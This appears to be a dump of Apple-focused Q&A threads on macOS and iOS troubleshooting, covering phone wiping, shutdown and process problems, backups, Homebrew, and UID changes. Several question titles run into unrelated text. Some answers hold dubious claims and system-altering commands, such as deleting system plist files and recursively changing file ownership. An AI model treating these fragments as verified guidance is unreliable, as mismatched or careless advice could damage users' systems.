I can make calls but can not receive any call from anyone. I have a new MacBook Pro so it rules out the possibility of the cache issue as described above. By the way, my mobile number is my AppleID.\n\nA: My iPhone was connected to the Mac via USB cable. Cutting the connection was the solution. Now it works.\n\nA: I have the same problem with a MacBook pro (late 2016, four thunderbolts) OSX 10.15.7. Can I call, but when receiving and accept it, fails.\nI have connected my computer by WIFI and LAN simultaneously. But when I disconnect the LAN connection, keeping only the WIFI, the problem usually it's solved.\n", "Q: The operation can't be completed because the item is in use … im using Macos Mojave, and some of my Xcode files were locked i guess by the system.

I've read that Apple has a hidden system font, called \"Last Resort\", that's used as a last ditch effort to show a unicode character in some cases.\nI'd like to use this font in a web page, to debug unicode issues. Is this possible?\nI've tried using:\nfont-family: \"LastResort\"\n\nin CSS, but it didnt seem to work. Any suggestions?\nEDIT: Note I originally put the attribute \"font-face\", which I've changed to \"font-family\", and have been using in my local tests.\n\nA: I suggest you use a different font which has the actual numbers of the characters and not just symbols like Last Resort.  Here is one, but it does not cover higher ranges of Unicode where many emoji are.  Another which seems to cover more characters is GNU Unifont.\n\nA: Use the following instead:\nfont-family: 'LastResort';\n\nHowever, this seems like an XY Problem. If you are having trouble with Unicode characters while developing for the web, I would suggest asking about your original issue on Stack Overflow.\n\nNote: font-face is not a valid CSS property.  It is an at-rule. The correct property is font-family.\n", "Q: Mail opens a window randomly in split screen with my fullscreen window I haven't been interacting with Mail for half an hour, but suddenly it opens its main window in split screen with the fullscreen video player that I'm watching. This happens every other day.\nI can't really say if this only happens when Mail is running, since it's hard to check that after the fact. Assuming it only happens when Mail is running, can something be done other than making the habit of always quitting Mail as soon as possible? Is there some hidden feature triggering this?\n\nA: I've been having the exact same problem for a while - particularly interesting while I'm trying to watch netflix!\nI found a checkbox option in the Mail->Preferences tab which says \"Prefer opening messages in split view when in full screen\" (see screenshot). I've unchecked that so here's hoping it solves the problem!\nIf it doesn't, I've seen a few other posts about this suggesting that the fact that it pops up at all is something to do with Google Calendar if you have any Google accounts assigned to your mailboxes. See if this link helps you if so!\n.\n\n", "Q: Does 'erase all content and settings' actually erase all data? I recently decided to sell two of my iPhone's (5 and 6s) and I used the 'erase all content and settings' option to wipe and factory reset my iPhone. Now, I'm a little concerned whether this is enough to prevent any data retrieval on my iPhone's and I was wondering if a simple reset in iPhone's settings can provide the same effects as that of an overwritten data? If not, what should I do? Is there a method for overwriting data on an iPhone as there is for macOS? \n\nA: As long as you follow the steps provided by Apple to erase your iOS device, it will erase all data on the device.  A simple 'reset' of the device is not the same as 'erase all contents and settings'.\nFollow these steps:\n\n\n*\n\n*If you paired an Apple Watch with your iPhone, unpair your Apple Watch.\n\n*Back up your device.\n\n*Sign out of iCloud and the iTunes & App Store. \n\n\n*\n\n*If you're using iOS 10.3 or later, tap Settings > [your name]. Scroll down and tap Sign Out. Enter your Apple ID password and tap Turn Off.\n\n*If you're using iOS 10.2 or earlier, tap Settings > iCloud > Sign Out. Tap Sign Out again, then tap Delete from My [device] and enter your Apple ID password. Then go to Settings > iTunes & App Store > Apple ID > Sign Out.\n\n\n*Go back to Settings and tap General > Reset > Erase All Content and Settings. If you turned on Find My iPhone, you might need to enter your Apple ID and password.\n\n*If asked for your device passcode or Restrictions passcode, enter it. Then tap Erase [device].\n\n*If you're switching to a non-Apple phone, deregister iMessage.\n\n*Contact your carrier for help transferring service to a new owner. If you aren't using a SIM card with your device, you can contact them to get help transferring service to the new owner.\n\n", "Q: Mojave 10.4.3 WiFi problems I updated to Mojave 10.14.3 last weekend at home. When I brought my MacBook Pro into the office Monday morning it showed it was connected to my office network, but there was no connection. I restarted the MacBook and it connected flawlessly. When I brought it home that night it said it was connected to my home network but it wasn't. Restarted and connected fine. Four days later it's still doing this every time I switch networks. Not a huge deal, but kind of a pain. Any suggestions?\n\nA: You can try to remove the network interface in \"System Preferences > Network\", select the network that isn't working, then press the \"-\" button.\n\nAnd then add it back again by pressing the \"+\" and selecting \"Wi-Fi\" and naming it \"Wi-Fi\".\n\nA: I have the very same problem however it is not a WiFi problem at all as my WiFi was fine.  Talked to 3 Apple support advisors before they connected me with a senior advisor.  The problem was that when I upgraded to Mojave I somehow Encrypted the OS which can easily happen.  Seems the Encrypted version affects BlueTooth, WiFi which interferes with internert access.  The solution was to do a back-up in Time Machine, then totally wipe (erase) your hard drive then reinstall Mojave (no Encryption)---And when you get to the option to transfer files, skip it and let it load.  Then test your WiFi internet then restore any files.  Worked perfectly for me.  Most of the 1st level support people do not know about this issue. \n", "Q: Cable Channels on Apple TV? I am thinking about getting an Apple TV.  I already have Netflix and Amazon Prime accounts, and I understand that there are apps on the Apple TV that will give access to those.  How do I get access to broadcast, and cable channels on the apple TV?  Are there apps for that?  Keep in mind I want everything to be legal and on the up and up.  Thanks for your help!\n\nA: There are many Apple TV apps for streaming services (e.g. PlayStation Vue, YouTube TV, etc.) that will replicate the functionality of a traditional cable subscription.  Your best bet would be to try doing a search in the App store to see which ones are available and what their capabilities are.\n\nA: If you want actual TV from antenna or cable, you need a network tuner in addition to your Apple TV which accepts a signal and makes it available on your computer network.\nI bought an HDHomerun a while back which allows for four simultaneous streams for unencrypted channels.  This combined with the Channels app on my Apple TV 4K worked very well.  Behaves like a TV with time shifting, and supports my bluetooth speaker.\n", "Q: How to sign out of Gmail on iPhone X in the iPhone mail.app The iPhone mail app has changed.

I can't imagine a camera without one, since fundamentally the camera can't know what the \"correct\" white balance is without this human input.\nWhere is it in the iOS camera?\n\nA: White balance on the iPhone using the default Camera app is set automatically so you can't change it during or before you take the picture.  \nYou can adjust it after the fact or you can use a 3rd party app that has white balance controls.\n\nA: The native iOS Camera app doesn't have this functionality.\nApps such as Camera+ Legacy and Camera+ 2 do have much more functionality. *\nSee this site for more info.\n* Disclaimer: I'm a satisfied user of Camera+ Legacy and Camera+ 2, and I am in no way financially or otherwise connected with LateNite Apps.\n", "Q: How do I prevent nginx from auto-loading using homebrew?

The no is Apple is all or none with iCloud sync of files - you get documents and desktop sync when you enable iCloud sync on macOS. \nBut you can make a new folder called local Documents or whatever and move all the files you want locally to the new folder, then enable cloud sync. Your Documents proper folder is in the cloud as is the desktop, but the Documents will be empty other than what you intentionally want to sync up.\n", "Q: Can search history be seen by Apple ID?

Did they see my search history?\n\nA: It is possible to see search history. \nIf Safari for iCloud is enabled all enabled devices will be able to see your search history when going into the tabs screen to see what tanks are open. NOTE: This is only recent history. I doubt that 4 years back you will be able to view it.\nIf you want to turn off search history go to Settings -> [your name] -> iCloud and turn Safari off.\n", "Q: anchored split screen across desktops Is there a way to have split screen, where one side remains anchored across all spaces/desktops?\nWhat I'm trying to do is essentially have two desktops split on the same screen, much like if you were having two screens connected at the same time side by side.\nCurrently the only solution seems to be split screens but on different desktops (i.e. if swipe to another desktop, new split screen setups, not one persistent one), but I want to have random things like spotify, chats, etc. on one side whilst I flick between apps like browsers, word, programming software etc.\nI have a widescreen so I have the space to do that, frankly otherwise this screen I just bought is too wide!\nFYI I'm using the LG 34\" 5k2k widescreen 34WK95U\n\nA: I've come up with one approach for the LG 34\" 5k2k screen...\nOn the same mac, I connected with a thunderbolt 3 cable, and then via an adaptor I connected the same mac via HDMI, the solution being the mac thinks you're connecting to two screens, and the LG monitor thinks it's receiving two input signals which can then be displayed via PBP mode.\nI have a 75/25 split and I'd say the resolution on the 25 side needs to be modified so text is readable which for me is at 800x1350, which doesn't give much space but just about works...

I am starting to accumulate too many processes on my Mac. No clue why this is happening, but it is causing a lot of problems such as:\n\n\n*\n\n*programs fail to start or hang on launch\n\n*in the terminal I get a lot of messages such as \"unable to fork\", for example I got this error in iTerm2: https://gitlab.com/gnachman/iterm2/issues/5027\n\n*also get some errors saying \"too many files open\" but I dont know what files these could be, I do not have any more programs running than usual and don't have much open myself.\n\n*cannot open any new terminal windows, and any current terminal windows cannot use pipes \n\n*at the lock screen, I try to enter my password but the entire UI becomes unresponsive; I type the password and hit 'Enter' but nothing happens for several minutes, I can click on buttons but they do not do anything\nThis just happened again, and I checked ps -aef and had 1,000+ proccesses.

Randomly it goes away on its own. Right now the number of total processes (ps -aef | wc -l) is back down to 350.\nTotal memory and CPU usage during all this is very low, so they do not seem to be culprits.\nAny idea what is going on?

It then proceeded to spawn 2 new threads per minute for the entire day. I caught it around 3:50pm when I started getting errors and again there were a total of 1056 processes running, including a massive amount of these pmset processes.

This is usually installed as part of a corporate setup, and is used to manage power saving settings across all the company's computers.\nUnfortunately it seems that the program has a bug where it is not compatible with High Sierra right now. The effect you see is that it spawns processes intended to set power saving settings, but due to a bug it spawns them over and over again because it \"thinks\" that they failed. This severely limits performance of the computer and eventually halts it completely.\nThe only thing to do is to report this to your IT department and/or directly to Aptean to ensure that the software is fixed and updated.\n", "Q: How do I download full resolution photos on my iphone (8+) to use offline? I used to keep all of my photos (literally 40K or so) on my iPhone. I did eventually fall into the iCloud trap, and have still not figured out a way to assure that a healthy number of my full resolution photos will be available to me when I am on a plane: the one time I know I'll have 5 hours with nothing to do but edit photos from the last decade. I know that \"recent\" full resolution photos are stored  on the phone, but going back to what date? And how does that help if I choose a  picture from 2014 to edit? Thoughts about how to edit while in \"airplane mode?\"\n\nA: You can download the full resolution photos to your phone by going to Settings -> tap on your photo -> tap iCloud -> tap Photos -> tap \"Download and Keep Originals\" (instead of \"Optimize iPhone storage\").

It looks as if it does actually turn off (turns black). But then a simple touch on the trackpad or a hit on any of the keys \"wakes it up\", as if it had been turned off and was powering on again (it goes through the black background screen with the white apple in the middle and the progress bar).\nIn contrast, if I force shut it down using the touch id button, then the MBP behaved as expected, i.e., it would only turn back on using the touch id button again, and would not turn back on by a simple touch on the trackpad or by pressing a key on the keyboard.\nEDIT: after a couple more tries, it appears I was mistaken, in the sense that even force shutting down the latpop does not actually solve the problem (see the discussion in the comments to Monomeeth's answer below)\nThis unfortunately has nothing to do with how long I wait between clicking \"Shutdown...\" and pressing a key or the trackpad: This has happened many time after waiting the whole night between clicking \"Shutdown...\" and pressing on the trackpad. In fact, I have clicked \"Shutdown...\" many times in the last month without ever having to press the touch id to power my laptop on: I always simply pressed on the trackpad, which made me believe this was the new normal with MBP and triggered my asking of the other related question.\nNote also that I never get an error message of the type: \"Application X prevented your laptop from shutting down\" after clicking \"Shutdown...\".\nI am obviously not fond of having a \"Shutdown...\" button that does not workperly pro and having to force shut down my laptop every time I want it to actually turn off.\nMy questions are:\n\n\n*\n\n*Is that a normal behavior for a new MBP? Anyone ever faced something similar? Are there any known instances of a new MBP not actually shutting down when clicking \"Shutdown...\" in the \"apple\" menu?\n\n*What might be causing it? Could it have anything to do with peculiar \"Energy saving\" settings? Or could it have something to do with an app that would be preventing the laptop from actually turning off without triggering an error message?\nEDIT: I have checked on my wife's new MBP, and it behaves in exactly the same way. Is that really a new feature of the latest generation of MBP?\n\nA: I'd start with resetting both the NVRAM and SMC (in that order). Before following the steps below, ensure you have no external hardware connected and that you're using the built-in keyboard.\nReset the NVRAM\nReset the NVRAM on your MBP as follows:\n\n\n*\n\n*Fully shut down your MBP. \n\n*Press the power button and then press the commandoptionPR keys.

By according to Apple I mean during an Apple Care call I had with them where they eventually put a Senior Tech on the line who explained all this and the below to me.\nThe only \"behavior\" you may change is to disable the \"any key restarts the MBP,\" such that only the power button is able to restart the machine.  It is because any key restarts the MBP that you are thinking that it must be returning from sleep; according to Apple, these new SSD MBPs are so fast on the boot that there is no chime they just goes straight back to login screen (if you have a PW protection or encryption enabled), or to the boot up process otherwise.\nBut if you observe closely it is not simply going right back to the Finder screen - hitting any key is taking the machine through the startup process, just it happens so fast that it seems like a wake up from sleep.\nAnyway you are wasting your time with all of the above the new SSD MBPs will continue to behave like this, and in fact the Sudo / Terminal proposed solution might delete something important and cause issues.\n\nA: I had this problem with my 13\" MBP 2011 model MacOS High Sierra, and the following commands in the Terminal resolved it.\nYou may need Admin access when prompted,\n\nsudo rm -f /Library/Preferences/com.apple.loginwindow.plist\nsudo rm -f /private/var/db/.AppleUpgrade\nsudo rm -f /private/var/db/.SoftwareUpdateAtLogout\nsudo reboot\n\n\nI even reinstalled macOS High Sierra before trying out the above solution but that did not work.\nSource: Black Screen With Cursor on Logout in Yosemite\n\nA: *\n\n*This is not normal behaviour, and unfortunately yes\n\n*No, I don't think anything like that is causing it\n\n\nIt seems to be a semi-common problem in new computers, :/ thanks apple.\nI just remembered a bit of a weird way to fix this:\n\n\n*\n\n*Go to system preferences -> startup drive\n\n*Push restart into target mode \n\n*Restart (using the power button)\n\n\nThat should fix it.

When I used a forensic tool to examine my phone, it recovered 27 notes, the 16 that I have and 11 \"deleted\" notes. All the \"deleted\" notes are named variations of 3 of the 16 notes. Each deleted note is a variation of the live note. I checked notes.sql db and although it only lists the 16 notes, I found the \"deleted\" portions at different offsets in the hex. My first thought was that the deleted notes were old / edited versions however, it seems that some of the deleted content has crossed from other notes or the note content is duplicated or tripled in the deleted portions. How does NotesApp deal with deleted/edited content from a note? Why is there \"deleted\" notes if they are still active? Any info would be appreciated.\n\nA: It has to do with the storage format \"sqlite\" that is used by Notes.app. Sqlite is a very common storage format used by very many apps, and also for programs on desktop computers, in embedded systems, etc.\nThe \"sqlite\" format makes it possible to structure data to enable fast searching, updating, etc. However, it is organized in such a way that when an application delete data, it is actually not \"erased\" as such on disk. Instead smaller blocks of data are marked as non-used. When the user adds new data these smaller blocks are reused in order to improve performance and ensure that the on-disk file does not grow unlimited.\nThis is why you can see parts of deleted notes inside the file, and also why you can see parts of differents notes \"cross each other\" in the file. The file is simply not read by the app in a linear fashion (i.e. from start to end), but instead in terms of blocks in various patterns accounting for the various writes and deletes that happened to the file over time.\n", "Q: Safari stops working when attached to a corporate network My work MBP is in a corporate network which has heavy security. For the last few months Safari has been driving me crazy. It will work for a period of time, then just stop. No matter what web page I ask for (Public like Google or StackOverFlow, or the companies own confluence or other servers) the blue progress bar goes to around 10-15% then just stops. The web page never loads, never times out. Just nothing. \nChrome doesn't have the same problems. But I'd rather use Safari. I'm guessing this could be an issue with the corporate proxies, but I don't know how to debug it. Sometimes restarting Safari gets it working again for a while, sometimes I have to restart the machine to get it back. Am on Mojave.\nAny advice? Corporate IT has no idea even though there's hundreds of Macbooks in here now.  \n\nA: \nCorporate IT has no idea even though there's hundreds of MacBooks in\n  here now.\n\nI'm not sure how you came to that conclusion because setting a policy like \"blocking Safari\" wouldn't be something that decided on by rank-and-file employees; IT management knows.\nThere are security products on the market that go well beyond deep packet inspection where IT can can use analytics and heuristics to determine what software you're using and block it. Since it seems to take Safari a few moments to stop working, this sounds most plausible.\n\nAny advice?\n\nYes.  Talk to IT.  Ask them why they allow Chrome and block Safari (there may be a valid reason for it.)\n", "Q: Finder Tags not working for any SMB files I'm having an issue with Finder Tags and SMB share?

It would take several minutes to mount, and then MacOS would warn me to back up the data.  When I tried copying Backups.backupdb out I got \"Error Code -36\" saying that some data couldn't be read or written.  \nI was able to copy a few (apparently non-corrupt) individual backups out using finder, but unfortunately Apple has removed a multitude of admin permissions, including the ability to change Backups.backupdb, so I'm unable to copy my backups into it.  Access denied (even with SIP disabled).  We're also not not allowed to modify folder permissions, FWIW.\nAny ideas on how to transfer individual backups into Backups.backupdb?\n\nA: I think I've found a workaround (or \"ridiculous hack\", if you will). You can't modify Backups.backupdb, but you can delete it and replace it (back up your backups, if you feel the need):\n\n\n*\n\n*Create a folder named \"WhosTheBoss\"\n\n*Copy any backups you want to keep in there (same directory structure)\n\n*Delete the original Backups.backupsdb folder\n\n*Rename \"WhosTheBoss\" to \"Backups.backupsdb\"\n\n*Point Time Machine and/or Migration Assistant to that location and win.\n\n", "Q: Develop in-house app for another company signing with own Apple Developer Enterprise account My company has regular/yearly Apple Developer Program membership.

Or must the siging be with their Enterprise account?\n\nA: Apple does not allow you to use company A's Enterprise account for signing apps to be distributed and used amongst employees of company B, unless company B is owned by company A. \nA few other exceptions exist, for example for car manufacturers and their dealerships, and for hotel chains and their individual hotels. Also an exception exists if the employees of company B are actually physically located at company A's premises, and company A control the devices (i.e. they own the devices or they can remove these apps again). If your case do not fit these exceptions, you'll need individual approval from Apple for you case. This is normally not possible to get.\n", "Q: how to find the last time I used my usb drive?

Applications installed on macOS are not always completely self-contained. Sometimes they write files in multiple locations outside their .app bundle, taking up space that they sometimes occupy even after we uninstall them. \nWhat I'm more interested in with this question, is understanding the ways in which an application (even when not launched), can slow down the OS (eg. boot time, shutdown time, GUI responsiveness, app launch time).\nI know that applications (both malicious and not) install:\n\n\n*\n\n*kexts\n\n*Login Items\n\n*LaunchDaemons\n\n*LaunchAgents\n\n\nBeyond these four, what are other ways in which installed software can negatively impact the performance/stability of the overall OS?\n\nA: One notable absentee from your list is the category 'plugins'. I.e. additional software that runs within existing software on your Mac. It could be browser plugins, plugins for Microsoft Office, or many other types of plugins.\nBesides that there's not really supposed to be other ways if you're only installing \"well-behaving\" software.\nIf you install software that is more or less malware, it could wreak havoc with your system by modifying system binaries, system configuration, system firmware or by creating other ways like LaunchDaemons/LaunchAgents to ensure that its own software is run on boot and continues to run.\n\nA: Program packages also contain information of their capabilities. Files like info.plist have to be scanned and added to the LaunchServices database. If that grows for example a right-click on a file can take quite a bit longer to make this noticeable enough.\nSometimes an application installs a bucket full of fonts, that nobody wants, mainly certain office applications. \nCaches are nice, if they are indeed small. The macOS caches grow and self-corrupt over time, mandating a deletion as there is no on-board mechanism to rectify this.\n\nLaunchDaemons and LaunchAgents (at /System/Library/, ~/Library/ and /Library/) \n\nare also found within application packages and in any case: \"not running at the time\" doesn't mean they do not run \"sometime\", eg when you're not really looking.  These are for LaunchDaemons, LoginItems and XPCServices. Usually these are moved on app-launch to their 'proper' places, but they can be also active from within the app (or by a proxy copied to a nested container in ~/Library).  \n Some examples:\n - really pestering: VOX.app/Contents/Library/LoginItems/Loop.app & VOX Agent\n- Another example might be DefaultFolderX: every time a file dialog opens this app adds its own routines from 9 frameworks to the once process\n- some audio software installs plugins into  /Library/Audio/Plug-Ins which then hook into the audio system and are not visible from Activity Monitor, despite adding to the system load when audio plays, trashing the app leaves the plugin behind\n- HP Printer Software has a Device Monitor running, that eats away CPU and is hard to find on disk\nAll programs leave behind cruft. Caches, receipts, preferences, database entries no longer valid etc. Everything within an application package goes if you drag it to the trash. But I know of no single de-installer that really catches all the cruft that gets littered around by the majority of applications.\nTherefore the more programs are installed the slower the system gets. Compared to 90s Windows this shouldn't get out of hand that easily.\nSome of the top locations to really watch out for other than /Applications:\n/Library/Extensions\n/Library/Audio/Plug-Ins\n/Library/Bundles\n/Library/Caches\n/Library/Frameworks\n/Library/Input\\ Methods\n/Library/Internet\\ Plug-Ins\n/Library/LoginHook\n/Library/QuickLook\n/Library/ScriptingAdditions\n/private/var/db\n/private/var/folders\nThat list is far from complete and also applies to the corresponding folders under /Users.\n\n\n*\n\n*Uncontrolled – and often quite unnecessary – installers, writing files all over the place are one problem. Unless you can inspect them with eg Pacifist, they should be considered \"untrusted\", and monitored closely.\n\n*There is no uninstaller in macOS. Once a program gets installed you have to trust the developer that the program doesn't write files all over the place and adds login-hooks, startup-programs, extensions, frameworks, fonts, daemons, input methods or plugins – to the system (or user Library) \n\n*The sheer number of applications/executables presents a slow down factor. One quite small one, compared to the above, but it nevertheless adds to the problem.\n\n*Actual malware or PUPA. Downloading and trying out lots of programs increases the chance that a bad apple gets onto the system and ruins the badge. \n\n*If the system is installed on HFSplus then of course the good old inefficiency of said system comes into play, to a degree. For example the directory structures get more inefficient over time, one reason why products like DiskWarrior exist. On APFS things are different, but there are not enough reports out there to say empirically whether it got better or worse overall. Generally all SSDs slow down when getting full and with age. The more files on it the more decisions the controller has to make on where to write the next bits and in the background all those bits have to be shuffled around for TRIM, GC and wear-levelling (not to mention plain bugs like in Samsung 840EVOs).\n\n*After a fresh install you may realise that isn't necessarily a really clean install: Sometimes a problem or slowdown factor was your reason to re-install the system, but then you used Migration Assistant, which is not always intelligent enough to not also migrate the problem to the new installation as well.\n\n*Psychology –– After re-installing a clean system it will certainly feel great to be able to do stuff with it again, after sitting through the long wait and reboots and rebuilds of things like caches and Spotlight indexes etc.\nWhen your Mac runs slow, give it a tuneup\nSpeed Up Your Mac\n7 Common Mistakes That Slow Your Mac Down\nWhy is my Mac Running Slow?\nWhy Is My Mac Running Slow? 5 Quick Tips to Speed Up Your Mac!\n26 Reasons Why a Mac Computer is Running Slow [Infographic]\nKeep apps and extensions to a bare minimum\nHow-To: Clean and speed up your Mac with free, trustworthy downloads\nHow-To – Unclutter your hard drive\n\nAs @jksoegaard rightly comments: a single 1KiB file that never gets used will not slow down the system. The above is just addressing the general bloat that badly written and maintained software unloads without benefit  to any user on small but expensive SSDs, where these files and bigger ones are numbering into the thousands. A few kilobytes here a few megs there, after a while you realise that some gigabytes added up and are nothing but pure waste. \nUnfortunately, most of the software for macOS falls now into that category (prime example: /System/iOSSupport/System/Library/PrivateFrameworks/MobileIcons.framework/Versions/A/Resources/MessagesDefaultIcon-32.png -> 32x24 pixels, but occupying the modest amount of 10,265,058 bytes on disk!

Its signal is very strong and this causes interference with my AMD RX-650 card, although I had put the cards in as far slots as possible on mainboard. When using the card normally there is no problem. But when using DLNA or AirDrop services, the screen gets a flicker and eventually goes off and on again and is absolutely unusable!\nHow can I fix the problem without making the card signal too weak and reducing the transfer speed significantly?\n\nA: I advise you to reduce the card signal level. This won't reduce the speed which is only related to the frequency of the carrier wave and the signal / noise ratio.\nThis will increase the overall signal / noise ratio of all the hardware using the bandwidth around the GHz (1 - 10 GHz). Net result: the interference should stop below a level to experimentally find. Then the network throughput will be better, but its scope (in meters reached) will be shorter. Most probably you will shrink your network radius from 100 m down to 25 m. You will also lower the quantity of micro-wave heating your eyes and your brain (every thing which is containing a lot of water).\n", "Q: Obtain a private URL to a file in iCloud Drive without making the file available to anyone with the link I would like to get links to files in my iCloud Drive so that I can paste links to them in other apps (notes, email, etc) for quick access to these files in the future.

It allows you to block numbers per area code while still white-listing numbers in your contacts.  It's a bit annoying as\n\n*\n\n*You can't just block out +1 (xxx)-xxx-xxxx, but most spam calls come from just a few area codes for me\n\n\n*You have to go into the app and have it re-whitelist every time you add or remove contacts.  A bit annoying, but I've received 20 robo-calls in a day, so probably worth the hassle.\nBlocking just my area code dropped my daily robo-call count from 20 or more to 2-3.  Slowly adding area codes as I get robo-calls from them.  Was able to put my ringer back on.\nPS: WideProtect can only block 40 million phone numbers.  This sounds like a lot, but when I'm trying to block every number except ones in my contact list it runs out of space fast.  Still happy with the product, but won't block everything out of the box.\nNOTE: Apple has added \"Silence Unkown Calls\" which makes this moot\n\nA: There is now an option to do this.

I want to be secure against a worst-case scenario because I'm about to start tinkering with my SSD (going to try installing Linux). What backup methods would allow me to perform a clean reinstall (I'm not interested in keeping files, just a working macOS system) of macOS if I were to destroy all the data on the hard drive? Based on research on the web, it seems that a bootable USB would do the trick, but all methods seem to rely on the cmd+R recovery mode combination, and I assume that that requires a hard drive that will at least start up.\n\nA: So, first of all you need at least a 16 GB USB Drive.  Formatted as Mac OS Extended (use disk utility). And you need to open up the Mac App Store and download the macOS Mojave (or any version supported by your Mac) Installer.\nThen follow this guide: https://support.apple.com/en-us/HT201372\nAfter that you can eject your USB Drive.\nThen when you need to reinstall macOS you shutdown your computer. Then hold down the option key then press the power button while holding down the option key until you see a boot picker. Then insert your USB Drive you created above. Use the arrow keys to select it then press enter. Then click disk utility and select your internal ssd and click erase. Then quit disk utility and click install macOS and follow the guide there.\nNow your on your way to a working macOS install. Enjoy!\n\nA: Like all changes to the system you need a backup as you say.\nThe easiest way is to produce a bootable backup.\nSo you need a Thunderbolt or USB external disk that is larger than your current data. Macs can boot off these type of disks.\nYou then need to make a bootable backup. And then test by booting your machine off this backup before starting playing with other installs. You choose the disk you boot off by holding the ⌥ also called Option) key down. https://support.apple.com/en-gb/HT202796\nYou can do this by copying with disk utility but it is much easier and will be better as they allow incremental backups in future to use an app like SuperDuper or Carbon Copy Cloner. They will also install a recovery partition on the backup disk for extra help.\n", "Q: How can I export only my notes from the Notes app and import to another Mac?

Can I alter the menu so that it has a search option (like Apple Music - screenshot attached)\n \n\nA: There is no setting in iOS to customize the action view displayed when 3D touching an app icon on iPhone Home screen. It is up to the app what items are displayed. For 3rd party apps, iOS generally displays a Share app name item.\nHowever, an app may provide settings within itself to customize what items it displays.

Go to command palette, under the view menu, and there is a command that says Shell Command: Install 'code' command in PATH.Click on this and it sets up a link from Applications/vscode to /usr/local/bin.  After that, you can just type code to run the program.\n\nA: Instead of having to make the necessary changes to be able to type open -a vscode in Terminal, why not just add the following to your ~/zprofile file, e.g.:\nexport PATH=\"/Applications/Visual Studio Code.app/Contents/Resources/app/bin:$PATH\"\n\nThen all you have to do in Terminal to open Visual Studio Code is type code and press enter.\nSee Launching from the command line# in Visual Studio Code on macOS for additional details.\n\n", "Q: avoiding python@2 redundant dependency I installed gdal using homedal because I need it for ortho4xp, which uses python3. I noticed that gdal depends on  both python and python@2. Gdal is not the only package doing this. It pulls in numpy, which also specifies both python versions as a dependency. It seems there are lots of packages still requiring python@2\nI'm assuming there's a reason for packages requiring both versions of python but I was wondering if there are ways of avoiding having to have python2 around?\n\nA: There is no getting around the pain of managing dependencies. What you are seeing is that for many, many years python 2 was the standard and as we finally are reaching the end of support, some major frameworks are making the move after preparing for years to do so.  For the next 6 months, I would expect most active or easy to port projects to move to python 3. Time will tell of course. \nIf you feel you want or need to force your transition to python 3 in homebrew, I would try first removing it so you can validate you actually need it.\nbrew rm python@2\n\nIf you do have it as a dependency, you probably can do nothing and just give up a little space and a little time as every package you care about gets updated to use python 3. Set your path to use the version you want and just let it fade into history.\n", "Q: How to prevent apps from from not letting you restart Mac OS When I press restart button I mean it. Though Netbeans, iTerm, XAMPP think that they know better than me, and I get an error that the process has been stopped because of one of these apps.\nIs there way to stop this circus once and for all, for all the apps together? I don't want any app at all to be able to stop me from restarting the system.\nThe idea is to make original \"restart\" button ignore other apps. I understand many apps won’t exit cleanly, I’m ok losing work and not being warned, I just want the fastest way to get on with the restart and not have it pause for any dialogs. \nIdeally, I can set this in the restart menu and change that system wide. If not, how can I automate a tool for this without typing much.\n\nA: Use a text editor to create a new file \"Shutdown.command\" and place it in your Desktop folder. The file should contain the following:\n#!/bin/bash\n/sbin/shutdown -h now\n\nThen when you double-click the new Shutdown file on your desktop, the system should immediately proceed to shut down without waiting for your apps. Your user needs to be an Administrator on the Mac for this to work.\nI read from your comments to the original question that you assume that this is the same holding the power button on the computer - that is no so. Holding the power button on the computer simply shuts down the power supply to the computer, which is not good as this can lead to problems with file systems, data not being saved, etc.\nWhen you use the above mentioned script, the system shuts down cleanly. This means that data still in RAM that hasn't been written out to disk will be written out to disk, and file systems on internal and external drives will be unmounted cleanly.\n", "Q: Detect if ctrl key is pressed In JavaScript for Automation (JXA), we can detect if the ctrl key is pressed with\nObjC.import(\"Cocoa\")\n$.NSEvent.modifierFlags & $.NSControlKeyMask\n\nIf ctrl is not pressed, the return will be 0. If it is, the value will be different.\nBut NSControlKeyMask is deprecated. I found NSEventModifierFlagControl but can’t get it to work.\nWhat is the current way to detect if the ctrl key is pressed?\n\nA: Per your latest comment, you state that the code you have quoted works in practice, and your only problem is you want to get rid of the deprecated NSControlKeyMask.\nSimply replace that word with NSEventModifierFlagControl and this is it.\nThe only thing Apple did is to change the name. In recent macOS NSControlKeyMask is even defined as simply being equal to NSEventModifierFlagControl. Both have the value 1 << 18 (i.e. the 18th bit is set to 1, rest is 0).\n", "Q: Making Conflicting UIDs across a LAN of MacOS and Linux hosts Consistent I have an expanding network and while I have the long term goal of eventually implementing Active Directory hosted on a QNAP NAS. However, in the meantime I have the issue of where my MacOS machines have one set of UIDs for the 2 or 3 users I use while my Linux machine have another.\nI learned that in Mojave you need to use dscl to change attributes like UID but I am not sure how I can set the UID scheme for new users to make the new Unix and MacOS accounts more easily line up going forward. While I envision Active Directory making this moot once its in place, I presume I must get my LANs UIDs and GUIDs under control first.\nAside from doing all of this manually by using tools like find and chown manually, are there tools for migrating to AD where normalizing UIDs for the same users across different hosts can be better automated and a reliable process with less risk of breakage? If not, I am pretty sure I know what I need to do and it will be gritting my teeth, but at least I know what it's going to take. If you have any suggestions that might make this easier and less dangerous please share your thoughts! For instance, I presume that no user should have it's UID changed while logged in, yes? Anwyay I welcome all thoughts and ideas!\n\nA: I used this procedure to change uid's on macOS Tiger and Ubuntu. The info on passwords has changed. \n\nOk, so how can I check my UID? I've heard that it's dangerous to\n  change the UID, so how should I do if I want the permissions to work\n  in both OSes?\n\nYou can change the permissions of files and directories in either OS.\nI suggest that you make a complete backup of your system.  You should create a second administrator account from which you use to change your original account.  You should log out your original account before proceeding.\nMac OS X ... harddrive -> Applications -> Utilities -> terminal\nUbuntu ... Applications > Accessories > Terminal\nor where ever the Terminal is today. \nYour current user is:\necho $USER\nLet's assume myuser\nTo find out your UID and GID do:\nls -ln\nls -l\n\nOr, you can use the id command.\nid\n\ncompare the output and write down what you find.\nYou best use the numeric value for your userid.  In this case it is 500.  To list all the files owned by a userid do:\nsudo find / -user 500 -exec ls {} \\;\n\nadding a -x before the / limits the search to the current file system.\nYou need to adjust the uid and gid in your account definition. \nIn the Ubuntu terminal,\nman 5 passwd  \n\n... will give you the format of the passwd file.\nsudo nano /etc/passwd\n\n... the format is user-name, password, uid, gid, ...\ncontrol-o\n  ... to save\ncontrol-x\n  ... to quit\nThe groups are defined in /etc/group\ncat /etc/group\n\nNow change the UID and GID of all files:\nYou best use the numeric value for your userid.  In this case it is 500.\nsudo find / -user 500 -exec chown 1100:211 {} \\;\n\n/* Where chown has the format of chown uid:gid file-name */\n/* adding -print before -exec lists the files that will be changed. */\n/* You may want to leave off :211 if your uid & gid are not paired. */\n/* Notice the -exec runs another command on the found file. */\n\nsudo find / -group 20 -exec chgrp 211 {} 